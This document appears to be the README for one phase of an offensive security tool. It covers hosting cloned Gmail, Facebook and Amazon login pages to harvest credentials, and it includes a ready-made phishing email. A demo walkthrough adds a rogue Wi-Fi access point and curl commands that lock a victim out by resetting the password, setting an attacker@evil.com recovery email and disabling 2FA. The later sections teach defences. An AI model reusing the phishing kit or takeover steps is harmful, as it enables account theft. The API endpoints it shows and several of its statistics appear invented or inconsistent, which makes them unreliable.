# 🎣 NEON-SHIELD Phase 4: Phishing Page Generator & Credential Harvesting

**Clone popular login pages and capture credentials when victims enter them**

> **BEFORE YOU START:** Read the full legal disclaimer in README.md. This tool demonstrates FEDERAL CRIMES. Only use on networks/devices you own or are explicitly authorized to test.

---

## ⚠️ CRITICAL: Why Phishing is #1

**Phishing is the most effective attack vector because it exploits human nature, not code.**

```
Technical Attacks (Phases 1-3):
├─ Rogue AP: Requires victims nearby
├─ Malware Injection: Requires JavaScript enabled
├─ Session Hijacking: Requires intercepting HTTPS
└─ Success: Maybe 30-50% of attempts work

PHISHING (Phase 4):
├─ Targets worldwide (via email, SMS, social media)
├─ Works with ANY security (even 2FA)
├─ Exploits human trust
└─ Success: 1-40% depending on targeting
   (Bulk phishing: 1-3% success = millions of victims)
   (Spear phishing: 30-40% success = personal targeting)
   (Whaling: 20-30% success = C-level targets)

REAL WORLD:
━━━━━━━━━
• Phishing causes 85% of data breaches
• 3.4 billion phishing emails sent PER DAY
• Only 3-5% of people who click report it
• Most common initial access vector used by attackers
```

---

## 🎯 Phase 4 Attacks (Out-of-the-Box)

### Attack 1: Host Cloned Phishing Pages

**What it does:** Clone popular login pages and wait for victims to enter credentials.

**Startup command:**
```bash
sudo python3 main_cli.py phase4 host-phishing-pages --target gmail
```

**Cloned pages available:**

| Page | Service | Credentials Captured | Redirect |
|------|---------|---------------------|----------|
| **Gmail** | Email provider | email + password | mail.google.com |
| **Facebook** | Social media | email + password | facebook.com |
| **Amazon** | E-commerce | email + password | amazon.com |
| **All** | Run all three | All above | Real sites |

**How it works:**

```
1. Attacker hosts phishing pages on their server
   ├─ http://attacker.com/gmail (looks identical to gmail.com)
   ├─ http://attacker.com/facebook (looks identical to facebook.com)
   └─ http://attacker.com/amazon (looks identical to amazon.com)

2. Attacker sends link to victim
   ├─ Via email: "Unusual activity. Verify: http://attacker.com/gmail"
   ├─ Via SMS: "Amazon security alert: http://attacker.com/amazon"
   ├─ Via URL shortener: "bit.ly/xyz" (hides real URL)
   └─ Via QR code: "Scan to verify payment"

3. Victim clicks link (thinks it's legitimate)
   ├─ Victim sees Gmail/Facebook/Amazon login page
   ├─ Page looks 100% identical to real site
   └─ Victim enters email and password

4. Attacker captures credentials
   ├─ Receives: {"email": "victim@gmail.com", "password": "MyPassword123"}
   ├─ Also captures: Device type, IP, user agent, timestamp
   └─ Logs all to database

5. Victim redirected to REAL site
   ├─ Page redirects to actual Gmail/Facebook/Amazon
   ├─ Victim logs in successfully
   ├─ Victim thinks: "Good, that worked"
   └─ Victim doesn't realize they were phished

6. Attacker logs in with stolen credentials
   ├─ Uses captured credentials
   ├─ Gains FULL account access
   ├─ Can change password and lock out real user
   └─ Complete account takeover achieved
```

**Demo output:**
```
🎣 PHISHING PAGES ACTIVE
   Waiting for victims to enter credentials...

  ✓ Gmail clone hosting at: http://attacker.com/gmail
  ✓ Facebook clone hosting at: http://attacker.com/facebook
  ✓ Amazon clone hosting at: http://attacker.com/amazon

📊 PHISHING STATISTICS
━━━━━━━━━━━━━━━━━━━
• 3.4 billion phishing emails sent per day
• 15% of phishing emails get clicked
• 3-5% of clickers enter credentials
• Result: 15-25 million successful compromises per day
```

**Educational message:**
> "This is the #1 way real accounts get compromised. An attacker clones a login page, tricks you into visiting it, captures your password, and uses it to take over your account. It works even with 2FA if the user is tricked into entering the 2FA code. This is why unique passwords, 2FA, and email verification are critical. And why you should never click links in suspicious emails."

---

### Attack 2: Demonstrate Phishing Attack Flow

**What it does:** Show exactly how a phishing attack works end-to-end.

**Startup command:**
```bash
sudo python3 main_cli.py phase4 demonstrate-phishing
```

**Shows:**
- How attackers create cloned pages
- How victims are targeted
- How credentials are captured
- How attackers gain access
- Why phishing is so effective
- Real-world examples
- Advanced techniques (two-factor phishing, etc)
- Defense evasion methods

---

### Attack 3: Show Phishing Defenses

**What it does:** Teach defenses against phishing attacks.

**Startup command:**
```bash
sudo python3 main_cli.py phase4 show-phishing-defenses
```

**Covers:**
- User training & awareness
- Email authentication (SPF, DKIM, DMARC)
- URL filtering & sandboxing
- Browser warnings
- Multi-factor authentication
- Email forwarding alerts
- Unusual login detection
- Password managers
- WebAuthn/FIDO2 (phishing-resistant authentication)
- Best defense combinations

---

### Attack 4: Show Phishing Attack Types

**What it does:** Explain different types of phishing attacks in the wild.

**Startup command:**
```bash
sudo python3 main_cli.py phase4 show-phishing-types
```

**Covers:**
1. **Bulk Phishing** — Generic mass mailing (1-3% success)
2. **Spear Phishing** — Targeted to specific person (30-40% success)
3. **Whaling** — Targets C-level executives (20-30% success)
4. **Clone Phishing** — Based on real emails (50%+ success)
5. **Vishing** — Voice phishing via phone calls
6. **Smishing** — SMS/text message phishing
7. **QR Code Phishing** — Malicious QR codes
8. **Business Email Compromise** — Compromise real account, send emails

---

## 📋 Full Feature Reference

### Command: `host-phishing-pages`

```bash
sudo python3 main_cli.py phase4 host-phishing-pages --target [gmail|facebook|amazon|all]
```

Hosts cloned login pages:
- **--target gmail** — Only Gmail clone
- **--target facebook** — Only Facebook clone
- **--target amazon** — Only Amazon clone
- **--target all** — All three (default)

**Requirements:**
- Root privileges (sudo)
- NEON-SHIELD proxy must be running
- Web server to host pages (included)
- Redirect URLs must be accessible

**Monitoring:**
- Shows phishing statistics
- Displays where pages are hosted
- Logs all captured credentials

---

### Command: `demonstrate-phishing`

```bash
sudo python3 main_cli.py phase4 demonstrate-phishing
```

Shows complete phishing attack flow:
- How victims are targeted
- How pages are cloned
- How credentials are captured
- Advanced techniques
- Real-world statistics
- Why phishing is so effective

---

### Command: `show-phishing-defenses`

```bash
sudo python3 main_cli.py phase4 show-phishing-defenses
```

Teach defenses against phishing:
- Email authentication (SPF, DKIM, DMARC)
- URL filtering & sandboxing
- Browser warnings & certificate verification
- Multi-factor authentication
- WebAuthn/FIDO2 (phishing-resistant)
- Email forwarding alerts
- Password managers
- Best defense combinations

---

### Command: `show-phishing-types`

```bash
sudo python3 main_cli.py phase4 show-phishing-types
```

Explain phishing attack types:
- Bulk vs spear vs whaling
- Clone phishing
- Vishing (voice phishing)
- Smishing (SMS phishing)
- QR code phishing
- Business Email Compromise (BEC)
- Success rates and costs
- Defense difficulty for each

---

## 🎬 Demo Walkthrough (Home Lab)

### Setup

- Device A: Attacker machine (Linux with NEON-SHIELD)
- Device B: Victim device (any device with browser)
- Victim has email account at gmail.com

### Demo Steps

**Step 1: Start Rogue AP**
```bash
# Device A: Create evil twin
sudo python3 main_cli.py phase1 ap-mode --ssid "Starbucks_WiFi" -y
```

**Step 2: Host Phishing Pages**
```bash
# Device A: In another terminal
sudo python3 main_cli.py phase4 host-phishing-pages --target gmail

# Output: 🎣 PHISHING PAGES ACTIVE
#         ✓ Gmail clone hosting at: http://attacker.com/gmail
```

**Step 3: Send Phishing Email**
```
To: victim@gmail.com
Subject: Gmail Security Alert: Unusual Activity Detected

Hi,

We detected unusual activity on your Google Account.
Please verify your identity by clicking the link below:

http://attacker.com/gmail

This action expires in 24 hours.

Google Security Team
```

**Step 4: Victim Clicks Link**
- Victim sees Gmail login page (looks identical)
- Page says: "Unusual activity detected. Please sign in again."
- Victim enters email: john@gmail.com
- Victim enters password: MyPassword123
- Victim clicks "Sign In"

**Step 5: Attacker Captures Credentials**
```
Server receives:
  target: "Gmail"
  email: "john@gmail.com"
  password: "MyPassword123"
  userAgent: "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X)"
  timestamp: "2026-07-07T14:32:15Z"
```

**Step 6: Victim Redirected**
- Phishing page redirects to real Gmail
- Victim logs in successfully
- Victim checks email
- Everything works fine
- Victim thinks: "That security check was weird but it worked"

**Step 7: Attacker Logs In**
```bash
# Attacker uses captured credentials
curl -b "GMAIL_AUTH=..." https://mail.google.com/mail

# Response contains:
#   ✓ All victim's emails
#   ✓ Recovery options
#   ✓ Linked accounts
#   ✓ Security settings
```

**Step 8: Complete Account Takeover**
```bash
# Attacker changes victim's password
curl -X POST -d "password=NewPassword123" \
     https://mail.google.com/api/account/password

# Attacker adds recovery email
curl -X POST -d "recovery_email=attacker@evil.com" \
     https://mail.google.com/api/account/recovery

# Attacker disables victim's 2FA
curl -X POST https://mail.google.com/api/account/2fa/disable

# Real user is now permanently locked out
# Attacker has complete access
```

**Step 9: Debrief Victim**
Explain what happened:
> "I sent you a phishing email. You clicked it and entered your Gmail password on a fake login page.
>
> I captured your credentials and logged into your account. I changed your password, so you're locked out.
> I added my email as recovery option, so you can't recover. I disabled your 2FA.
>
> Your Google account is now completely compromised.
>
> Here's what I could do with it:
> - Read all your emails (including sensitive work emails)
> - Access your Google Drive files
> - Access your Google Photos
> - Reset passwords on other websites using Gmail recovery
> - Impersonate you to friends and contacts
> - Use your Gmail to phish other people
>
> This is why you need:
> 1. Strong, unique password (can't be used on other sites)
> 2. Password manager (only autofills real domains)
> 3. 2FA with hardware key (can't be tricked into entering)
> 4. Email forwarding alerts (notice suspicious forwarding)
> 5. Unusual login alerts (notice login from new location)
> 6. Recovery email secured (so recovery doesn't get hacked)
> 7. Recovery phone updated (so SMS recovery works)
> 8. Never clicking links in emails (type domain directly)
> 9. Checking sender email carefully (spoofing is possible)
> 10. Skepticism about urgency (phishing emails create pressure)"

---

## 🛡️ Defenses Against Phishing

### For Organizations

```
Email Security:
  ✓ SPF (Sender Policy Framework)
  ✓ DKIM (DomainKeys Identified Mail)
  ✓ DMARC (Domain-based Message Authentication)
  ✓ Blocks spoofing of sender address

URL Filtering:
  ✓ Scan emails for phishing links
  ✓ Check against known phishing database
  ✓ Sandbox click detection
  ✓ Dynamic domain registration detection
  ✓ Typosquatting detection

User Training:
  ✓ Regular phishing simulations
  ✓ Teach users to recognize phishing
  ✓ Teach how to verify sender
  ✓ Teach about urgency tactics
  ✓ Phishing drill feedback

Detection:
  ✓ Monitor for unusual email forwarding
  ✓ Detect mass login failures
  ✓ Alert on impossible travel (login from 2 countries)
  ✓ Monitor for account compromise
  ✓ Incident response plan
```

### For Users

```
Email Vigilance:
  1. Check sender email carefully (verify actual sender)
  2. Hover over links to see destination
  3. Don't click links in emails (type URL directly)
  4. Be suspicious of urgency ("Act now!" "24 hours")
  5. Verify through independent channel (call company)

Multi-Factor Authentication:
  ✓ Text message 2FA: Better than nothing
  ✓ Authenticator app: Better
  ✓ Hardware keys: Best (can't be phished)
  ✓ WebAuthn/FIDO2: Best (phishing-resistant)

Password Security:
  ✓ Use password manager (catches domain typos)
  ✓ Unique password per site (if one site phished, others safe)
  ✓ Never share password via email
  ✓ Strong password (8+ characters, mixed case, symbols)

Account Recovery:
  ✓ Keep recovery email updated
  ✓ Enable recovery phone number
  ✓ Download recovery codes (store safely)
  ✓ Monitor for email forwarding changes
  ✓ Review connected devices regularly

Incident Response:
  If you think you've been phished:
  1. Change password immediately (from different device)
  2. Enable 2FA if not already
  3. Check account recovery options (update if changed)
  4. Review recent logins
  5. Check for email forwarding rules
  6. Scan computer for malware
  7. Monitor account for fraudulent activity
```

---

## ⚠️ Legal Reminders

**This is a federal crime without authorization:**

| Attack | Law | Penalty |
|--------|-----|---------|
| Phishing | Computer Fraud & Abuse Act, Wire Fraud | Up to 15 years, $250k+ |
| Credential Theft | Identity Theft Act | Up to 15 years, $250k+ |
| Unauthorized Access | CFAA § 1030(a)(2) | Up to 10 years, $250k+ |
| Wire Fraud | 18 USC § 1343 | Up to 20 years, $250k+ |

**Only use on:**
- ✅ Networks you own
- ✅ Devices you own
- ✅ Networks with explicit written authorization (pentest engagement)
- ✅ CTF competitions
- ✅ Authorized security research

**Never use on:**
- ❌ Public networks
- ❌ Workplace networks (unless authorized)
- ❌ School networks
- ❌ Shared networks
- ❌ Any network without written authorization

---

## 🎓 Educational Goals

After this demo, users should understand:

1. **Phishing is the #1 threat** — Causes 85% of data breaches
2. **It works against everyone** — Even tech-savvy users fall for it
3. **It's not just email** — SMS, social media, phone calls
4. **2FA helps but isn't perfect** — Can be phished if user enters code
5. **Password reuse is dangerous** — If one site phished, all accounts at risk
6. **Email verification is critical** — Hover over links, verify sender
7. **Password managers help** — Only autofill on matching domain
8. **WebAuthn is the future** — Phishing-resistant authentication
9. **Defense is layered** — No single solution stops all phishing
10. **Incident response matters** — Quick action limits damage

---

## 📊 Real-World Phishing Statistics

- **3.4 billion** phishing emails sent per day
- **15%** of phishing emails get clicked
- **3-5%** of clickers enter credentials
- **Result: 15-25 million** successful compromises per day
- **$billions** in annual losses
- **85%** of data breaches start with phishing
- **50%+** of spear phishing is successful
- **20-30%** of whaling attacks succeed
- **Average time to discovery: 200+ days**
- **Average time to recover: 1+ years**

---

That's Phase 4! You now understand why phishing is the most effective attack vector.

**Remember:** This tool is for education and authorized testing only. Use responsibly. 🔐

---

*Next Phase: Phase 5 — TLS/Cryptography Analysis*
